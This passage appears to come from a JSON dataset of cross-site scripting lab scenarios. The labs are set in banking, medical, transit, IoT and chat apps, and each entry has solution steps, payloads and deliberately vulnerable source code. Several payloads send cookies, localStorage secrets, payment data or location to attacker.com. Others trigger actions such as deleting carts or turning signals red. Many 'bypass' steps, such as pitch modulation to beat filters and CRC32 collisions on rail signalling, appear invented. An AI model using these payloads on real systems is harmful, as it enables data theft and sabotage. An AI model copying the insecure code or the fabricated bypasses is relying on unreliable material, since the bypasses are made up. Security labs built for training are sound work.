      "3. Exploit parser state confusion between markdown and HTML contexts",
      "4. Trigger through message quote/reply functionality"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      ":warning:`'><svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>",
      "\\`\\`\\`html\n<svg><!--</code>--><script>alert(1)</script>\\`\\`\\`"
    ],
    "srcCode": "function renderMessage(text) {\n  return text\n    .replace(/:([\\w-]+):/g, '<img src=\"emoji/$1.png\">')\n    .replace(/`([^`]+)`/g, '<code>$1</code>');\n}"
  },
  {
    "Lab scenario": "DOM XSS in AI-Powered Chatbot Financial Advisor",
    "Lab Description": "A robo-advisor platform reflects user risk profiles in D3.js visualizations. The application uses <foreignObject> to embed unsanitized LLM responses in SVG charts. To solve: Inject XSS through crafted investment goals that execute during portfolio simulation.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Intercept WebSocket message with OWASP ZAP",
      "Craft payload: {\"goal\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
      "Bypass CSP using d3-annotation plugin vulnerabilities",
      "Trigger through risk assessment PDF export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<foreignObject><template shadowroot><script>alert('PORTFOLIO')</script>",
      "{\"profile\":\"Conservative<script>new Image().src='//attacker.com?data='+localStorage.secrets</script>\"}"
    ],
    "srcCode": "socket.on('update', data => {\n  d3.select('#chart').html(`<svg>${data.goal}</svg>`);\n});"
  },
  {
    "Lab scenario": "Stored XSS in Encrypted Chat Message Metadata",
    "Lab Description": "An E2EE messaging app stores message timestamps in IndexedDB without validation. The React frontend decrypts and renders location metadata using dangerouslySetInnerHTML. To solve: Inject XSS through crafted GPS coordinates that execute during map pin hover.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Signal Protocol encrypted payload: lat=0&long=0&note=<script>alert('CHAT_DB')</script>",
      "Bypass WebCrypto validation using IV manipulation",
      "Exploit Mapbox GL popup rendering vulnerabilities",
      "Trigger through message expiration animations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"location\":\"0,0<img src=x onerror='navigator.clipboard.readText()'>\"}",
      "<details ontoggle=alert(1) open></details>"
    ],
    "srcCode": "const decrypted = await crypto.subtle.decrypt(key, encrypted);\ndocument.getElementById('meta').innerHTML = decoder.decode(decrypted);"
  },
  {
    "Lab scenario": "DOM XSS in Voice Banking IVR Transcript Viewer",
    "Lab Description": "A phone banking system converts voice call transcripts to HTML using insecure Web Speech API output. The application renders timestamps with innerHTML without escaping angle brackets. To solve: Inject XSS through spoken phrases that execute when agents review call recordings.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Say payload during IVR: \"My account number is <svg/onload='fetch(`/api/balance`).then(r=>r.text()).then(d=>new Image().src=`http://attacker.com?data=${d}`)'>\"",
      "Bypass audio-to-text homoglyph filtering using pitch modulation",
      "Exploit Web Audio API AnalyserNode visualization",
      "Trigger through call quality assurance reviews"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "Account\\u0020number\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
      "<audio src=x onerror=alert(1)>"
    ],
    "srcCode": "speechRecognition.onresult = e => {\n  const transcript = e.results[0][0].transcript;\n  document.getElementById('call-text').innerHTML = transcript;\n};"
  },
  {
    "Lab scenario": "Stored XSS in Cryptocurrency Wallet Recovery Phrase Grid",
    "Lab Description": "A hardware wallet management portal stores BIP-39 mnemonics as SVG grids in IPFS. The React frontend dangerously renders seed phrase visualizations. To solve: Inject XSS through crafted word positions that execute during backup verification.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify seed.json: {\"words\":[\"apple\",\"<svg/onload='navigator.usb.requestDevice({filters:[]})'>\",\"chair\"]}",
      "Bypass BIP-39 checksum validation using entropy padding",
      "Exploit Three.js InstancedMesh matrix synchronization",
      "Trigger through paper wallet PDF generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"grid\":\"<foreignObject><template shadowroot><script>alert('SEED_PWN')</script>\"}",
      "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
    ],
    "srcCode": "wallet.on('load', () => {\n  ReactDOM.render(<SVGWrapper content={wallet.seedGrid} />, root);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in AI Mortgage Calculator Chatbot",
    "Lab Description": "A home loan platform's chatbot parses natural language income statements into HTML tables. The application's Markdown-to-LaTeX converter fails to handle matrix environments. To solve: Inject XSS through salary descriptions that bypass PDF sanitization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send message: \"My income is $\\begin{bmatrix}<script>alert('PREAPPROVAL')</script>\\end{bmatrix}$\",",
      "Bypass KaTeX sanitizer using \newenvironment hooks",
      "Exploit Puppeteer PDF rendering race conditions",
      "Trigger through automated pre-approval emails"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "\\begin{tabular}{|c|}\\hline<script>alert(1)</script>\\\\ \\end{tabular}",
      "$$\\pi = 3.14<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>$$"
    ],
    "srcCode": "function renderChatToPDF(text) {\n  const html = marked.parse(text);\n  return pdf.create(html); // Vulnerable HTML-to-PDF conversion\n}"
  },
  {
    "Lab scenario": "DOM XSS in Stock Trading Signal Webhook Preview",
    "Lab Description": "A algo-trading platform reflects unsanitized webhook JSON data in TradingView charts. The application uses Angular's bypassSecurityTrustHtml for strategy annotations. To solve: Inject XSS through crafted alert messages that execute during backtest rendering.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Configure webhook: {\"message\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
      "Bypass TV JS API sandbox using postMessage handler injection",
      "Exploit Pine Script strategy.entry() label rendering",
      "Trigger through historical volatility simulations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"signal\":\"BUY<script>new Image().src='http://attacker.com?key='+localStorage.apiKey</script>\"}",
      "<math><maction actiontype='statusline#xss'>alert(1)</maction>"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${webhookData}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Blockchain Smart Contract Event Logs",
    "Lab Description": "A DeFi analytics platform renders Ethereum event logs as HTML using web3.js. The application parses contract ABIs without sanitizing indexed parameters. To solve: Inject XSS through malicious event emissions that execute when users filter transactions.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Deploy contract with event: emit Transfer(address(0), \"<svg/onload='alert(`DAO_DRAIN`)'>\"",
      "Bypass Solidity ABI encoding validation using tuple nesting",
      "Exploit The Graph subgraph visualization vulnerabilities",
      "Trigger through token holder CSV exports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "event Transfer(address indexed from, string calldata memo);\n// Memo: </script><svg/onload='alert(1)'>",
      "{\"logs\":[{\"topics\":[\"0x3c7363726970743e616c6572742831293c2f7363726970743e\"]}]}"
    ],
    "srcCode": "contract.on('Transfer', (from, to, memo) => {\n  document.getElementById('tx-list').innerHTML += `<div>${memo}</div>`;\n});"
  },
  {
    "Lab scenario": "DOM XSS in Product Review Carousel",
    "Lab Description": "An online marketplace renders user reviews in a React carousel using dangerouslySetInnerHTML. The application converts Markdown comments to HTML without sanitizing <details> tags. To solve: Inject XSS that triggers when shoppers expand review details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept review submission with Burp Suite",
      "Craft payload: `Rating: 5/5 <details ontoggle=alert('CART_HIJACK') open>`",
      "Bypass CSP using AngularJS ng-include directive",
      "Trigger through mobile app's infinite scroll"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<img src='x' onerror='navigator.sendBeacon(\"https://attacker.com\", localStorage.paymentData)'>",
      "<details open ontoggle=\"fetch('/api/cart?delete=true')\">"
    ],
    "srcCode": "function Review({ text }) {\n  return <div dangerouslySetInnerHTML={{ __html: marked.parse(text) }} />;\n}"
  },
  {
    "Lab scenario": "Stored XSS in Loyalty Point Calculator",
    "Lab Description": "A retail chain's CRM stores customer tier calculations in PostgreSQL with disabled pg_escape_string. The Vue frontend renders loyalty status using v-html. To solve: Inject XSS through crafted purchase history that executes during point redemption.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use Postman to send payload: {\"purchases\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
      "Bypass GraphQL input validation using alias injection",
      "Exploit Highcharts tooltip rendering vulnerabilities",
      "Trigger through birthday reward emails"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"history\":\"</textarea><script>alert('LOYALTY_OVERRIDE')</script>\"}",
      "<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script>"
    ],
    "srcCode": "app.post('/loyalty', async (req, res) => {\n  await pool.query('INSERT INTO purchases VALUES ($1)', [req.body.history]);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in AR Virtual Try-On",
    "Lab Description": "A fashion app's WebGL-based virtual mirror parses JSON accessory metadata without HTML entity encoding. The application converts product SKUs to tooltips using innerHTML. To solve: Craft SKU containing XSS that executes when users share looks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify product feed: {\"sku\":\"DRESS-3Cscript3Ealert(1)\", ...}",
      "Bypass 3D model validation using Babylon.js texture injection",
      "Exploit WebXR anchor point synchronization",
      "Trigger through social media sharing"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"id\":\"TSHIRT-<script>alert('TRYON_DATA')</script>\"}",
      "<model><body onload=\"document.write('<iframe src=attacker.com>')\"/>"
    ],
    "srcCode": "gltfLoader.load(modelUrl, (gltf) => {\n  document.getElementById('tooltip').innerHTML = gltf.userData.sku;\n});"
  },
  {
    "Lab scenario": "DOM XSS in Flash Sale Countdown Timer",
    "Lab Description": "A deal site's Next.js timer component reflects URL parameters in its SVG-based countdown. The application uses date-fns without escaping timezone abbreviations. To solve: Inject XSS through crafted tz parameter during daylight saving transitions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify URL: ?tz=EST<svg/onload='fetch(\"/api/coupons?apply=all\")'>",
      "Bypass Intl.DateTimeFormat validation using legacy TZ aliases",
      "Exploit requestIdleCallback timing attacks",
      "Trigger through email reminder links"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?tz=GMT+<script>document.write('<img src=//attacker.com?c='+document.cookie)>",
      "<animate attributeName=\"opacity\" values=\"1; <script>alert(1)</script>\" dur=\"1s\"/>"
    ],
    "srcCode": "export default function Timer({ params }) {\n  return <div dangerouslySetInnerHTML={{ __html: format(params.tz) }} />;\n}"
  },
  {
    "Lab scenario": "Stored XSS in Supply Chain Inventory API",
    "Lab Description": "A warehouse management system stores stock codes in MongoDB without input validation. The Angular frontend renders pallet locations using [innerHTML]. To solve: Inject XSS through RFID tag data that executes during stock takes.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Spoof RFID tags with payload: STOCK-<script>alert('SUPPLY_CHAIN')</script>",
      "Bypass EPC Gen2 encoding checks using TID memory banks",
      "Exploit AGV robot path visualization",
      "Trigger through cold chain monitoring alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"location\":\"Aisle 3 <img src=x onerror='new AudioContext().createScriptProcessor()'>\"}",
      "<math><maction actiontype=\"statusline#xss\">alert(1)</maction>"
    ],
    "srcCode": "this.http.get('/stock').subscribe(res => {\n  this.inventory = this.sanitizer.bypassSecurityTrustHtml(res.data);\n});"
  },
  {
    "Lab scenario": "DOM XSS in Patient Portal Lab Results Viewer",
    "Lab Description": "A hospital EHR system renders PDF lab reports as HTML using pdf-lib without proper sanitization. The application converts PDF annotations to DOM elements using innerHTML. To solve: Inject XSS through crafted lab comments that execute when doctors view results.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use PDFKit to create malicious annotation: /Contents (<script>alert('PHI_LEAK')</script>)",
      "Bypass PDF/A-3 validation using incremental updates",
      "Exploit Mozilla pdf.js rendering vulnerabilities",
      "Trigger through multi-provider consults"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "BT /F1 12 Tf 0 Tc 0 Tw ( <script>navigator.sendBeacon('https://attacker.com', document.body.innerHTML)</script> ) Tj ET",
      "<</Type/Annot/Subtype/Text/Contents(<iframe/src=javascript:alert(1)>>"
    ],
    "srcCode": "pdfDoc.getAnnotations().then(annots => {\n  document.getElementById('comments').innerHTML = annots.map(a => a.contents);\n});"
  },
  {
    "Lab scenario": "Stored XSS in MRI Machine Scheduling System",
    "Lab Description": "A radiology workflow manager stores DICOM metadata in MariaDB with disabled input escaping. The Angular frontend renders patient preparation instructions using [innerHTML]. To solve: Inject XSS through crafted scan protocols that persist across modality worklist updates.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify MWL request: (0040,0275) <svg/onload='fetch(\"/api/scanners?force_recalibrate=true\")'>",
      "Bypass DICOM VR validation using multi-frame injection",
      "Exploit OpenLayers ROI annotation rendering",
      "Trigger through contrast agent alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "(0010,0010) PN [<script>alert('PATIENT_SWAP')</script>]",
      "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationstart=\"alert(1)\">"
    ],
    "srcCode": "app.post('/mwl', (req, res) => {\n  pool.query('INSERT INTO schedule VALUES ?', [req.body]);\n});\n// Client:\n<div [innerHTML]=\"protocol\"></div>"
  },
  {
    "Lab scenario": "Mutation XSS in Telemedicine Video Chat",
    "Lab Description": "A telehealth platform converts WebRTC data channel messages to HTML using a flawed Markdown parser. The application's emoji shortcode processor allows nested code blocks. To solve: Craft message that bypasses :emoji: syntax to execute script during session recording.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send chat: :warning:`'><svg/onload='alert(\"DIAGNOSIS_EDIT\")'>",
      "Bypass DOMPurify using SVG foreignObject injection",
      "Exploit MediaRecorder API timestamp synchronization",
      "Trigger through transcript export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      ":pill: <xmp><plaintext><img src=x onerror=alert(1)>",
      "\\`\\`\\`html\n<svg><!--</code>--><script>alert(1)</script>\\`\\`\\`"
    ],
    "srcCode": "function parseMessage(text) {\n  return text\n    .replace(/:([\\w-]+):/g, '<img src=\"emoji/$1.png\">')\n    .replace(/`([^`]+)`/g, '<code>$1</code>');\n}"
  },
  {
    "Lab scenario": "DOM XSS in Smart Pill Dispenser Mobile App",
    "Lab Description": "An IoT medication manager renders dosage schedules in React Native WebView without escaping. The application converts NFC tag payloads to HTML using dangerouslySetInnerHTML. To solve: Program NFC tags with XSS that executes when caregivers scan the device.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Proxmark3 to write NFC tag: <iframe srcdoc='<script>parent.alert(1)</script>'",
      "Bypass NDEF Type Name Format validation using empty TNF",
      "Exploit React Native postMessage handler vulnerabilities",
      "Trigger through low-stock alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "NDEF Record: TNF=0, PAYLOAD=<script>navigator.bluetooth.requestDevice()</script>",
      "<math><maction actiontype=\"statusline#xss\">alert('DOSE_OVERRIDE')</maction>"
    ],
    "srcCode": "NfcManager.registerTagEvent(tag => {\n  WebView.injectJavaScript(`document.body.innerHTML += '${tag.ndefMessage}'`);\n});"
  },
  {
    "Lab scenario": "Stored XSS in Genomic Data Visualization Portal",
    "Lab Description": "A precision medicine platform stores VCF files in HDFS without sanitizing INFO fields. The Vue frontend renders variant annotations using v-html. To solve: Inject XSS through crafted genetic markers that execute during cohort analysis.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify VCF: INFO=<ID=XSS,Number=1,Type=String,Description=\"<script>alert('DNA_DATA')</script>\"",
      "Bypass GA4GH schema validation using reserved INFO keys",
      "Exploit BioJS 3D protein viewer tooltips",
      "Trigger through pharmacogenomic reports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "##INFO=<ID=CSQ,Number=.,Type=String,Description=\"<svg/onload='alert(1)'>\"",
      "chr1\t100\t.\tA\tT\t100\tPASS\tXSS=<iframe/src=javascript:alert(1)>"
    ],
    "srcCode": "vcfParser.parse(file).then(data => {\n  this.annotations = data.metadata.info;\n});\n// Template:\n<div v-html=\"annotations.XSS\"></div>"
  },
  {
    "Lab scenario": "DOM XSS in Adaptive Traffic Light Control API",
    "Lab Description": "A smart traffic system's web interface reflects intersection IDs from URL parameters in Three.js visualizations. The application converts SCATS protocol data to SVG without sanitizing phase timing values. To solve: Inject XSS through crafted phase parameter that executes during emergency vehicle preemption.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Intercept API request: GET /intersection?id=0<script>alert('GRIDLOCK')</script>",
      "Bypass NTCIP 1202 validation using VISSIM simulation data",
      "Exploit OpenGL shader error handling",
      "Trigger through pedestrian crossing activation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?id=0<svg xmlns='http://www.w3.org/2000/svg' onload='fetch(\"/api/lights?state=red\")'>",
      "{\"phase\":\"3 <math><maction actiontype='statusline#xss'>alert(1)</maction>\"}"
    ],
    "srcCode": "app.get('/intersection', (req, res) => {\n  res.render('view', { id: req.query.id });\n});\n// Client:\ndocument.getElementById('signal').innerHTML = id;"
  },
  {
    "Lab scenario": "Stored XSS in Smart Waste Bin Fill-Level Dashboard",
    "Lab Description": "A municipal waste management system stores ultrasonic sensor data in InfluxDB without input validation. The React frontend renders bin status using dangerouslySetInnerHTML in D3.js heatmaps. To solve: Inject XSS through spoofed MQTT payloads that trigger during collection route optimization.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use Node-RED to inject: {\"fill\":\"80%<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
      "Bypass LoRaWAN payload encryption using OTAA key leakage",
      "Exploit Leaflet.heat gradient rendering vulnerabilities",
      "Trigger through predictive maintenance alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"bin_id\":\"TRUCK-<script>navigator.geolocation.getCurrentPosition(e=>fetch('https://attacker.com?loc='+e.coords)</script>\"}",
      "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
    ],
    "srcCode": "mqttClient.on('message', (topic, message) => {\n  ReactDOM.render(<BinStatus data={message} />, root);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Water Quality Sensor XML Feed",
    "Lab Description": "A smart water grid parses OGC SensorThings API responses into HTML tables. The application's XML parser fails to handle namespaces in SWE Common data arrays. To solve: Craft malicious sensor observation containing XSS that executes during flood prediction modeling.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify observation: <swe:values>3Cscript3Ealert('CONTAMINATION')</swe:values>",
      "Bypass WaterML 2.0 schema validation using escaped CDATA",
      "Exploit CesiumJS info box rendering",
      "Trigger through EPA compliance reports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<om:result xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)</html:script>",
      "<!--<script>--><svg/onload=alert(1)>"
    ],
    "srcCode": "xmlParser.parseString(data, (err, result) => {\n  document.getElementById('readings').innerHTML = result.toString();\n});"
  },
  {
    "Lab scenario": "DOM XSS in Public Transit Real-Time Map",
    "Lab Description": "A bus tracking system reflects unsanitized vehicle IDs from GTFS-RT feeds in Mapbox GL popups. The application uses Angular's bypassSecurityTrustHtml for passenger load indicators. To solve: Inject XSS through crafted vehicle positions that execute during route deviation alerts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Spoof GPS feed: {\"vehicle\":\"VH-<svg/onload='fetch(`/api/vehicles?command=stop`)'/>\"}",
      "Bypass GTFS trip_update validation using timestamp rollbacks",
      "Exploit Turf.js buffer calculation vulnerabilities",
      "Trigger through paratransit booking integrations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"id\":\"BUS12<script>new Image().src='http://attacker.com?data='+localStorage.schedules</script>\"}",
      "<math><maction actiontype=\"statusline#xss\">alert('ROUTE_HIJACK')</maction>"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${vehicle.status}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Emergency Response Chat Logs",
    "Lab Description": "A city's crisis management system stores responder messages in Elasticsearch without escaping. The Vue frontend renders incident timelines using v-html. To solve: Inject XSS through crafted triage codes that execute during mutual aid requests.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Send payload: {\"code\":\"CODE-<script>alert('EVAC_ORDER')</script>\"}",
      "Bypass CAP protocol validation using polygon geofence wrapping",
      "Exploit ArcGIS API for JavaScript popup vulnerabilities",
      "Trigger through Everbridge integration alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"incident\":\"</textarea><script>alert('CBRN_LEAK')</script>\"}",
      "<details open ontoggle=\"navigator.mediaDevices.getUserMedia({video:true})\">"
    ],
    "srcCode": "app.post('/incidents', (req, res) => {\n  elasticClient.index({ index: 'alerts', body: req.body });\n});\n// Client:\n<div v-html=\"incident.code\"></div>"
  },
  {
    "Lab scenario": "DOM XSS in Autonomous Truck Platooning API",
    "Lab Description": "A freight management system reflects unsanitized truck IDs from V2V (Vehicle-to-Vehicle) messages in Angular visualizations. The application converts SAE J1939 data to SVG without escaping. To solve: Inject XSS through crafted vehicle spacing parameters that execute during platoon formation.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Intercept DSRC (Dedicated Short-Range Communications) messages using GNU Radio",
      "Craft payload: {\"truck_id\":\"<svg/onload='fetch(`/api/platoons?disband=true`)'>\"}",
      "Bypass AASHTO validation using false GNSS timestamps",
      "Trigger through emergency braking simulations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "truck=TR-<script>document.write('<iframe src=attacker.com>')</script>",
      "<math><maction actiontype='statusline#xss'>alert('PLATOON_HIJACK')</maction>"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${truckData}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Maritime Container Tracking System",
    "Lab Description": "A global shipping portal stores ISO 6346 container codes in MongoDB without input validation. The Vue frontend renders cargo manifests using v-html. To solve: Inject XSS through malicious BIC codes that execute during customs clearance workflows.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use Postman to send payload: {\"container\":\"MSKU<script>alert('CARGO_THEFT')</script>\"}",
      "Bypass SOLAS verification using checksum spoofing",
      "Exploit Leaflet.markercluster plugin vulnerabilities",
      "Trigger through hazardous material alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"bic\":\"TGHU\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
      "<img src='x' onerror='navigator.geolocation.watchPosition(p=>fetch(`http://attacker.com?lat=${p.coords.latitude}`))'>"
    ],
    "srcCode": "app.post('/containers', (req, res) => {\n  db.collection('cargo').insertOne(req.body);\n});\n// Client:\n<div v-html=\"container.bic\"></div>"
  },
  {
    "Lab scenario": "Mutation XSS in Drone Delivery Waypoint Planner",
    "Lab Description": "A last-mile delivery system parses GeoJSON waypoints into CesiumJS maps without proper sanitization. The application's XML-to-HTML converter fails to handle KML namespace injections. To solve: Craft malicious flight path containing XSS that executes during FAA airspace checks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload payload: <kml><Document><name><![CDATA[</name><svg/onload=alert('NO_FLY_ZONE')>]]>",
      "Bypass DJI FlySafe validation using altitude wrapping",
      "Exploit Three.js glTF model metadata injection",
      "Trigger through battery level warnings"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<Placemark><name><script>alert(1)</script></name></Placemark>",
      "{\"coordinates\":\"-118.25,34.05<iframe srcdoc='<script>parent.alert(1)</script>'\"}"
    ],
    "srcCode": "kmlParser.parse(file, (err, result) => {\n  document.getElementById('map').innerHTML = result;\n});"
  },
  {
    "Lab scenario": "DOM XSS in Railway Signaling Asset Management",
    "Lab Description": "A rail network monitoring tool reflects unsanitized track circuit IDs from IEC 62290 telemetry in React dashboards. The application uses dangerouslySetInnerHTML for failure alerts. To solve: Inject XSS through crafted balise parameters that execute during train detection events.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GSM-R messages using Software Defined Radio",
      "Craft payload: {\"balise_id\":\"BAL-<svg/onload='fetch(\"/api/signals?aspect=red\")'>\"}",
      "Bypass ERTMS/ETCS packet validation using CRC32 collisions",
      "Trigger through axle counter resets"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"track\":\"SNCF-<script>alert('SIGNAL_OVERRIDE')</script>\"}",
      "<details open ontoggle=\"navigator.credentials.get({otp: true})\">"
    ],
    "srcCode": "function Signal({ data }) {\n  return <div dangerouslySetInnerHTML={{ __html: data }} />;\n}"
  },
  {
    "Lab scenario": "Stored XSS in Warehouse Robot Pathfinding Interface",
    "Lab Description": "An automated fulfillment system stores AMR (Autonomous Mobile Robot) grid maps in PostgreSQL with disabled escaping. The Angular frontend renders SLAM trajectories using [innerHTML]. To solve: Inject XSS through malicious navigation waypoints that execute during inventory cycle counts.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify ROS navigation_stack parameters: <param name=\"costmap\" value=\"<script>alert('INVENTORY_SABOTAGE')</script>\"",
      "Bypass OMPL motion planning validation using NaN injections",
      "Exploit RViz visualization vulnerabilities",
      "Trigger through picker workstation integrations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"waypoint\":\"Aisle-<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>\"}",
      "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
    ],
    "srcCode": "this.http.get('/amr').subscribe(res => {\n  this.grid = this.sanitizer.bypassSecurityTrustHtml(res.data);\n});"
  }
  ,
    {
      "Lab scenario": "Online Support Chat Stored XSS in Message Content",
      "Lab Description": "The support chat system stores user-submitted messages and reflects them using innerHTML in the agent interface. The application doesn't sanitize content before rendering. To solve: Inject a script in the message and trigger execution in the agent view.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the /chat endpoint and send a message with XSS payload.",
        "View the stored message in /agent interface.",
        "Inspect the DOM to confirm innerHTML is used.",
        "Confirm the payload executes in the agent's browser.",
        "Verify control over agent\u00e2\u20ac\u2122s session or DOM."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(document.domain)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.get('/chat', (req, res) => { res.send(`<form method='POST'><input name='msg'><button>Send</button></form>`); }); app.get('/agent', (req, res) => { const output = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${output}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Event Scheduler Reflected XSS in Title Field",
      "Lab Description": "The event scheduler reflects the 'title' parameter in a JavaScript block that sets page content. The application directly inserts the title value into a JS string using double quotes. To solve: Escape the context and execute arbitrary JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to /event?title= and test payload reflection.",
        "Check the page source for the script tag usage.",
        "Confirm title is injected inside a quoted string.",
        "Craft a payload using quotes or semicolons.",
        "Trigger alert to validate execution."
      ],
      "payloads": [
        "\";alert('XSS');//",
        "';alert(1);//",
        "`;alert(document.domain)//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/event', (req, res) => { const title = req.query.title || 'My Event'; res.send(`<html><head><script>var t = \"${title}\";</script></head><body></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Bug Tracker Stored XSS in Issue Description",
      "Lab Description": "The bug tracker stores submitted issue descriptions and renders them using innerHTML in the issue detail page. No sanitization is performed. To solve: Submit a script payload in the description and view the issue to trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a bug report via /report with an XSS payload in the description.",
        "Open the issue detail via /issue?id=1.",
        "Inspect how the description is rendered using innerHTML.",
        "Trigger payload execution in browser.",
        "Confirm that JavaScript executes in the page context."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const issues = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/report', (req, res) => { issues.push({ desc: req.body.description }); res.redirect('/issue?id=1'); }); app.get('/issue', (req, res) => { const issue = issues[0]; res.send(`<div id='desc'></div><script>document.getElementById('desc').innerHTML = \"${issue.desc}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Search History Dashboard DOM XSS via Previous Queries",
      "Lab Description": "The dashboard fetches and displays past search queries using JavaScript by injecting each query into the DOM using innerHTML. To solve: Inject a malicious query that executes script when reflected.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a query with an XSS payload via /search?q=.",
        "Go to /dashboard to see stored queries.",
        "Inspect how queries are rendered in the DOM.",
        "Confirm innerHTML usage for rendering.",
        "Trigger script execution from injected payload."
      ],
      "payloads": [
        "<script>alert(1)</script>",
